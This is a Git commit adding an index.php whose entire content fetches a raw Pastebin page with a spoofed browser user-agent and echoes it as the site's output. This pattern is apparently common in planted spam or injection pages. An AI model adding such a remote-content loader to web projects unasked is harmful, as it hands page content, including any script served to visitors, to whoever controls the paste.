3ea21d0b31fc7ced96d9f208588681920b362b09
Tituss22 <158983092+Tituss22@users.noreply.github.com>
2025-05-27 10:57:03 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,15 @@
+<?php
+$url = "https://pastebin.com/raw/kAhrKTxP";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36');
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+?>
